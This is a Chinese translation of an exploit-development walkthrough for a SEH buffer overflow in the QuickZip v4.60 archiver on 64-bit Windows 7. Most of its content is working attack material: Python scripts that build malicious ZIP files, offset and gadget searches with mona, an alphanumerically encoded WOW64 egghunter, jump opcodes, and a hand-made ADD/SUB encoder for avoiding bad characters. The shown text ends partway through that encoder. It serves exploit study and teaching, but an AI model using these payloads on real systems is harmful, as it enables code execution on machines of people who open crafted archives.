> 原文链接: https://www.anquanke.com//post/id/86065 


# 【技术分享】QuickZip V4.60 缓冲区溢出漏洞详解


                                阅读量   
                                **118671**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：knapsy.com
                                <br>原文地址：[http://blog.knapsy.com/blog/2015/11/25/easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/](http://blog.knapsy.com/blog/2015/11/25/easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/)

译文仅供参考，具体内容表达以及含义原文为准

**[![](https://p3.ssl.qhimg.com/t019718f44041c29677.jpg)](https://p3.ssl.qhimg.com/t019718f44041c29677.jpg)**

****

翻译：[**shan66**](http://bobao.360.cn/member/contribute?uid=2522399780)

**预估稿费：300RMB**

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**<br>**

**前言**

**本文将为读者详细介绍QuickZip v4.60缓冲区溢出漏洞方面的知识。**由于漏洞在2010年就出现了，所以它的设计仅适用于32位Windows XP。所以，我决定尝试在64位Windows 7上重现该漏洞，这将是一个（有趣的）挑战！

<br>

**PoC**

为此，我从exploit-db中抓取了QuickZip v4.60 Windows XP漏洞，并将用它创建了一个简单的PoC来触发崩溃。 



```
#!/usr/bin/python
header_1 = ("x50x4Bx03x04x14x00x00x00x00x00xB7xACxCEx34x00x00x00"
"x00x00x00x00x00x00x00x00xe4x0fx00x00x00")
header_2 = ("x50x4Bx01x02x14x00x14x00x00x00x00x00xB7xACxCEx34x00x00x00"
"x00x00x00x00x00x00x00x00x00xe4x0fx00x00x00x00x00x00x01x00"
"x24x00x00x00x00x00x00x00")
header_3 = ("x50x4Bx05x06x00x00x00x00x01x00x01x00"
"x12x10x00x00x02x10x00x00x00x00")
print "[+] Building PoC.."
max_size = 4064
payload = "A" * max_size
payload += ".txt"
print "[+] Length = " + str(len(payload))
exploit = header_1 + payload + header_2 + payload + header_3
mefile = open('cst.zip','w');
mefile.write(exploit);
mefile.close()
print "[+] Exploit complete!"
```

上述代码创建了一个压缩文件，其中只包含一个名为4064A的文件，它的扩展名为“.txt”。 Header_1，header_2和header_3是ZIP文件结构所需的标题。 我不会详细介绍，但您可以在这里阅读更多。

如果您在QuickZip中打开刚创建的ZIP文件，并尝试提取其内容（或只需双击文件名），那么QuickZip就会崩溃。

<br>

**了解崩溃详情**

好的，我们来运行PoC，看看到底发生了什么。

使用上面的Python脚本创建ZIP文件，使用QuickZip打开它，启动ImmunityDebugger，附加到QuickZip进程，并在QuickZip中双击文件名以触发崩溃。 注意：我们将不断重复这个过程！ 

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01e0cc47b1edd46a51.png)

很好，崩溃如期而至。 另外，这里出现了一个异常，屏幕底部可以看到“Access violation when writing to [00190000]”。 这意味着我们试图写入一个无效的内存地址，从而触发了一个异常。

下面，我们来研究一下SEH链。 

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t015386f8f3cce684c6.png)

很好，看来我们能够控制nSEH指针！下面，我们尝试算出偏移量。 

<br>

**偏移量 **

一如既往，我要借助mona（[https://github.com/corelan/mona](https://github.com/corelan/mona) ）来完成许多工作。

首先，我们生成一个4064个独特字符的模版，并将其放在PoC漏洞利用代码的有效载荷中： 

```
!mona pc 4064
```

再次触发崩溃，看看会发生什么情况。

[![](https://p2.ssl.qhimg.com/t01c3290e8e33c81139.png)](https://p2.ssl.qhimg.com/t01c3290e8e33c81139.png)

呃，崩溃看起来有点不同。 这里的问题是LEAVE指令尝试从堆栈跳回到0EEDFADE地址，不过这里是该程序的无效内存地址。

此外，似乎我们无法控制SEH了。

[![](https://p1.ssl.qhimg.com/t019059240af6cf2e73.png)](https://p1.ssl.qhimg.com/t019059240af6cf2e73.png)

但是，请注意，我们实际上是在内核模块中（请看Immunity窗口的名称：“CPU – main thread, module KERNELBA”）。 使用SHIFT + F9将执行权传回给程序，看看是否触发另一个异常，但是是在QuickZip模块中。

[![](https://p3.ssl.qhimg.com/t010383bc80201de6ab.png)](https://p3.ssl.qhimg.com/t010383bc80201de6ab.png)

[![](https://p4.ssl.qhimg.com/t01d3d1b6a6f36f0050.png)](https://p4.ssl.qhimg.com/t01d3d1b6a6f36f0050.png)

真棒，看起来成功了！

使用以下命令让mona计算所有偏移量：

```
！mona findmsp
```

[![](https://p4.ssl.qhimg.com/t019eebd2574a5c32a4.png)](https://p4.ssl.qhimg.com/t019eebd2574a5c32a4.png)

在这里，我们最感兴趣的偏移是nSEH field: offset 292。

让我们用偏移信息更新PoC，并尝试再次触发崩溃。 



```
#!/usr/bin/python
header_1 = ("x50x4Bx03x04x14x00x00x00x00x00xB7xACxCEx34x00x00x00"
"x00x00x00x00x00x00x00x00xe4x0fx00x00x00")
header_2 = ("x50x4Bx01x02x14x00x14x00x00x00x00x00xB7xACxCEx34x00x00x00"
"x00x00x00x00x00x00x00x00x00xe4x0fx00x00x00x00x00x00x01x00"
"x24x00x00x00x00x00x00x00")
header_3 = ("x50x4Bx05x06x00x00x00x00x01x00x01x00"
"x12x10x00x00x02x10x00x00x00x00")
print "[+] Building PoC.."
max_size = 4064
nseh_offset = 292
payload = "A" * nseh_offset     # padding for nSEH
payload += "BBBB"               # nSEH
payload += "CCCC"               # SEH
payload += "A" * (max_size - len(payload))   # padding for the rest of payload
payload += ".txt"
print "[+] Length = " + str(len(payload))
exploit = header_1 + payload + header_2 + payload + header_3
mefile = open('cst.zip','w');
mefile.write(exploit);
mefile.close()
print "[+] Exploit complete!"
```

[![](https://p4.ssl.qhimg.com/t0171a9250022c9c463.png)](https://p4.ssl.qhimg.com/t0171a9250022c9c463.png)

太好了，我们控制了SEH！让我们将异常传给程序（SHIFT + F9），并进一步调查发生了什么。

[![](https://p1.ssl.qhimg.com/t016f6c609fa7726a69.png)](https://p1.ssl.qhimg.com/t016f6c609fa7726a69.png)

当然，另外一个异常也被触发，因为43434343是这个程序的无效内存地址，但是让我们看看堆栈上到底发生了什么——通常是SEH溢出，我们需要调用一组POP-POP-RET指令来返回到缓冲区。

找到这样的指令是很容易的，但首先，我们必须知道允许使用哪些字符。这就是我们需要关注的下一个问题。

<br>

**坏字符**

总的来说，大部分是这样的。为什么？因为我们的溢出是针对filename参数的，而文件名用到的字符类型是相当有限的： 通常只有ASCII可打印的字符。

如果使用手动方式的话，那么使用mona通过遍历方法找到所有坏的字符将需要太长的时间，所以这里简单假设除了0x00、0x0a和0x0d（分别代表NULL、换行和回车）之外，我可以使用ASCII表中所有的字符（最高值为0x7F的字符）。

这个假设可能会比事情比实际情况要更困难（因为我需要避免使用实际可以使用的字符）一些，或者可能会导致更多的问题，如果我的假设范围内的某些字符其实是错误的话。

我不喜欢这样做假设，但为了进行这个练习，这里例外一次。

我只需要记住，要格外小心，如果有情况，则需要再次检查坏的字符。这有点冒险，但很好玩，继续！ 

<br>

**POP-POP-RET**

让我们通过mona来寻找一个易于使用的POP-POP-RET指令：

```
！mona seh
```

[![](https://p5.ssl.qhimg.com/t01ccd901c6d21a2383.png)](https://p5.ssl.qhimg.com/t01ccd901c6d21a2383.png)

这里找到很多结果（7909！），但突出显示的结果看起来最有希望——全部由字母数字字符组成，位于QuickZip.exe二进制文件本身中，有望使其更具跨平台特性，因为我们不希望依赖特定的操作系统DLL。

这里唯一的问题是0x00字节，但是由于程序的地址空间的原因，每个地址都以0x00开头，所以我们来尝试一下，看看是否会影响我们的漏洞利用代码。

更新PoC漏洞利用代码，用 x33  x28  x42  x00替换目前代表SEH的CCCC，再次触发崩溃并考察SEH链。 

[![](https://p3.ssl.qhimg.com/t01a61ffb8c5632d2f0.png)](https://p3.ssl.qhimg.com/t01a61ffb8c5632d2f0.png)

好的，看起来我们的地址没有乱码，跟我们的预期相符。 设置断点（F2），然后按SHIFT + F9将控制权传递给程序。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01f9060034fced1add.png)

如您所见，我们将重定向到POP-POP-RET指令，让我们用F8进行操作，并在RETN 4指令之后停止。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01dbf4eb3cb82298d1.png)

真棒，我们已经进入有效载荷…但有一个问题：因为NULL字节的缘故，SEH链之后的所有东西都被切断了，所以没有给我们太多的空间做任何事情。

<br>

**shellcode去哪里了？**

好的，我们分析一下，看看我们进展情况。

我们设法让它崩溃了，并且能控制SEH，这非常好！ 问题是我们的有效载荷受制于一个非常有限的字符集，并且因为我们必须使用NULL字节的地址来调用POP-POP-RET指令，我们的有效载荷被切断了，并且留给shellcode的空间也不是很大。 

那么它究竟有多大呢？ 别忘了，为了获得SEH，我们还在有效负载开始部分进行了填充：

[![](https://p4.ssl.qhimg.com/t01d0028dcb72756e3f.png)](https://p4.ssl.qhimg.com/t01d0028dcb72756e3f.png)

那么我们有多少空间呢？ 共计292个字节。 不幸的是，这些是不够的。

不过，这个问题好像可以用egghunter来解决！

Egghunter只是一堆指令，在程序的内存空间中查找一个特定的、已知的字节序列（“egg”），一旦找到，将重定向到该区域。

这样我们就不用担心我们的shellcode在哪里结束了，我们可以调用eghtunter例程，它会为我们找到它们！ 

听起来不错，但下一个问题是，有效载荷的“截止”部分真的位于在内存中吗？ 我们来看看吧。

让我们生成3764个单字符的模版（在NULL字节之后填写我们的有效负载），并用它替换现有的A。

```
！mona pc 3764
```

我们触发崩溃，当我们得到我们的第一个异常时，不要将异常传递给程序，而是调用以下命令来在内存中搜索以前生成的模版：

```
！mona findmsp
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01735607be87e80cc7.png)

太棒了！ 有效载荷的整个“截断”部分仍然在内存中，所以我们应该能够成功地使用egghunter来获取我们的shellcode。 

<br>

**Egghunter**

现在我们能够使用egghunter来获取我们的shellcode，但是我们只有292个字节可供使用。实际上，我们可以用292字节空间做许多事情，但是别忘了，我们只能使用非常有限的字符集。

我们试着用metasploit的x86 / alpha_mixed编码器对egghunter进行编码，看看在这之后还剩下多少空间。

首先，让我们生成egghunter有效载荷。 请记住，我们正在使用64位操作系统，因此还需要使用相应的egghunter例程（有关更多详细信息，请访问[https://www.corelan.be/index.php/2011/11/18/WOW64-egghunter/](https://www.corelan.be/index.php/2011/11/18/WOW64-egghunter/)   ）：

```
！mona egghunter -wow64
```

将生成的字节复制到文本文件中，并使用xxd将其转换为二进制文件： 



```
# cat egghunter-wow64.txt 
31db53535353b3c06681caff0f42526a265833c98bd464ff135e5a3c0574e9b8773030748bfaaf75e4af75e1ffe7
# cat egghunter-wow64.txt | xxd -r -p &gt; egghunter-wow64.bin
```

现在，我们需要让编码器确保只用ASCII可打印字符。



```
# msfencode -e x86/alpha_mixed bufferregister=eax -i egghunter-wow64.bin
[*] x86/alpha_mixed succeeded with size 146 (iteration=1)
buf = 
"x50x59x49x49x49x49x49x49x49x49x49x49x49x49" +
"x49x49x49x49x37x51x5ax6ax41x58x50x30x41x30" +
"x41x6bx41x41x51x32x41x42x32x42x42x30x42x42" +
"x41x42x58x50x38x41x42x75x4ax49x66x51x49x4b" +
"x52x73x53x63x62x73x36x33x4ex53x6fx30x75x36" +
"x6dx51x59x5ax49x6fx36x6fx72x62x71x42x42x4a" +
"x66x46x56x38x74x73x78x49x4cx4bx4bx64x61x74" +
"x49x6fx47x63x31x4ex50x5ax77x4cx77x75x53x44" +
"x49x79x38x38x52x57x36x50x50x30x33x44x6cx4b" +
"x59x6ax4ex4fx32x55x38x64x4ex4fx70x75x6bx51" +
"x6bx4fx79x77x41x41"
```

注意：我已经使用bufferedregister = eax选项，这是因为编码器需要找到它在内存中的位置，以便能够对有效载荷进行解码。 最初，负责该项工作的例程不在ASCII可打印的字符集中，因此会破坏我们的有效载荷。

指定bufferregister选项基本上就是告诉编码器不用担心如何在内存中找到自己的位置，我们会事先做好这件事情，我们将其地址放在EAX寄存器中。 这样，我们的编码后的egghunter就是纯ASCII字符（更多关于生成字母数字shellcode的信息可以在这里找到）。

我们更新我们的PoC漏洞利用代码，以反映我们迄今为止所做的工作的成效。 



```
#!/usr/bin/python
header_1 = ("x50x4Bx03x04x14x00x00x00x00x00xB7xACxCEx34x00x00x00"
"x00x00x00x00x00x00x00x00xe4x0fx00x00x00")
header_2 = ("x50x4Bx01x02x14x00x14x00x00x00x00x00xB7xACxCEx34x00x00x00"
"x00x00x00x00x00x00x00x00x00xe4x0fx00x00x00x00x00x00x01x00"
"x24x00x00x00x00x00x00x00")
header_3 = ("x50x4Bx05x06x00x00x00x00x01x00x01x00"
"x12x10x00x00x02x10x00x00x00x00")
print "[+] Building PoC.."
max_size = 4064
nseh_offset = 292
# msfencode -e x86/alpha_mixed bufferregister=eax -i egghunter-wow64.bin
# [*] x86/alpha_mixed succeeded with size 146 (iteration=1)
egghunter = ("x50x59x49x49x49x49x49x49x49x49x49x49x49x49"
"x49x49x49x49x37x51x5ax6ax41x58x50x30x41x30"
"x41x6bx41x41x51x32x41x42x32x42x42x30x42x42"
"x41x42x58x50x38x41x42x75x4ax49x66x51x49x4b"
"x52x73x53x63x62x73x36x33x4ex53x6fx30x75x36"
"x6dx51x59x5ax49x6fx36x6fx72x62x71x42x42x4a"
"x66x46x56x38x74x73x78x49x4cx4bx4bx64x61x74"
"x49x6fx47x63x31x4ex50x5ax77x4cx77x75x53x44"
"x49x79x38x38x52x57x36x50x50x30x33x44x6cx4b"
"x59x6ax4ex4fx32x55x38x64x4ex4fx70x75x6bx51"
"x6bx4fx79x77x41x41")
payload = egghunter
payload += "A" * (nseh_offset - len(payload))   # padding for nSEH
payload += "BBBB"                               # nSEH
payload += "x33x28x42x00"                   # SEH
payload += "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev"
payload += ".txt"
print "[+] Length = " + str(len(payload))
exploit = header_1 + payload + header_2 + payload + header_3
mefile = open('cst.zip','w');
mefile.write(exploit);
mefile.close()
print "[+] Exploit complete!"
```

让我们触发崩溃，将控制权传递给该程序并执行POP-POP-RET指令。 之后，在CPU窗口中向上滚动，寻找egghunter有效载荷和一组EC ECX指令（代表字符A）的结束位置。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01749569873a64387a.png)

好的，看起来像是在那里，它似乎也是正确的:没有使用不符合要求的字符！

<br>

**跳转回来**

现在我们还有更多的事情需要考虑——这里最重要的一点是，我们需要把egghunter的地址放在EAX中，然后跳转到那里。

我们如何在空间有限的情况下做到这一点？ 首先，我们有多少空间？ 简单计算一下就知道是146字节（nseh偏移减去egghunter的大小）。

146字节可以做什么？ 我们只需要写几个指令，但是它们必须属于允许使用的有限的字符集。 在这种情况下，我们不能使用已经用于egghunter的通用编码器，因为我们根本没有足够的空间来满足它。

所以，我们需要创建自己的编码器！ 这听起来很让人头疼，但实际上比看起来要简单得多。

首先，我们来看看目前在程序中的位置。 

[![](https://p4.ssl.qhimg.com/t01d92e96ae5113865c.png)](https://p4.ssl.qhimg.com/t01d92e96ae5113865c.png)

我们只有4个字节，可由我们支配用来跳回有效载荷并开始写定制的编码器。同时，这4个字节最好是字母数字。 幸运的是，有多个指令可供使用，特别是在那些情况下！

在这方面，可以参考TheColonial分享的相关技巧：http://buffered.io/posts/jumping-with-bad-chars/。

简而言之，我们可以简单地使用JO和JNO指令来调用近转移指令到我们的有效载荷。 但我们能跳多远？ 通过用一些允许的字符的包裹后，我发现一些坏的字符会被转换为A2，它转换成十进制就是92，这应该能给我们提供足够的空间，以创建我们的自定义编码器。

让我们用metasm生成所需的操作码，并将它们添加到我们的有效载荷中，用于代替nSEH。 



```
metasm &gt; jno $-99
"x71x9b"
metasm &gt; jo $-99
"x70x9b"
```

注意： x9b（-99），因为这是一个不符合要求的字符，所以实际上将转换为 xa2（-92）。

我们的PoC部分应该如下所示： 



```
payload = egghunter
payload += "A" * (nseh_offset - len(payload))   # padding for nSEH
payload += "x71x9bx70x9b"                   # nSEH: jno $-99; jo $-99 ==&gt; 9b will actually be converted to A2, which is $-92
payload += "x33x28x42x00"                   # SEH
payload += pattern                              # pattern to look for in memory
payload += ".txt"
```

让我们触发崩溃，将执行权传递给程序，单步调试POP-POP-RET指令，观察单步调试JNO / JO指令时会发生什么。 

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t015152176586a2c4b4.png)

令人惊奇的是，这次跳转到了我们的有效载荷！ 现在，创建自定义编码器，编写指令，跳转到egg hunting例程。

<br>

**定制编码器**

为了跳到eghunter，我们需要写许多条指令，因为不使用“坏”字符的话，就没有直接的方法。

要解决这个问题，我们需要执行以下操作：

**找出我们想要写的指令的操作代码**

**使用简单的数学指令（即ADD和SUB），通过允许的字符将来自上述步骤的操作码的值放入我们选择的寄存器（例如EAX）中**

**我们将这个寄存器的值写入堆栈，从而将我们想要的指令写入ESP指向的内存区域**

听起来很复杂？ 但实际上并不是那么糟糕。 

首先，我们需要调整堆栈才能写入我们控制的内存区域。 通过观察ESP的值和我们目前的位置（上面的截图），可以发现，我们需要将ESP偏移0x62C（0x0018FB58（EIP的值）减去0x0018F528（ESP的值）再减去0x4（用于填充的空字节））。

这可以通过以下指令来实现： 



```
push esp;
pop eax;
add eax, 0x62C;
push eax;
pop esp;
```

上述指令的相应操作码如下所示： 



```
"x54"                  # push esp;
"x58"                  # pop eax;
"x05x2cx06x00x00"  # add eax, 0x62C
"x50"                  # push eax;
"x5c"                  # pop esp;
```

但是，这里有一个问题—— “ x05  x2c  x06  x00  x00”有两个NULL字节，这将破坏我们的漏洞利用代码。

然而，我们可以通过使用有效字符执行几次ADD和SUB指令来设置成我们想要的值，例如， 



```
x05x2dx07x01x01    # add eax, 0x0101072D
x2dx01x01x01x01    # sub eax, 0x01010101
                        # total:   0x00000630
```

瞧！我们可以使用有效的字符来实现同样的事情。下面我们来更新漏洞利用代码，看看会发生什么。

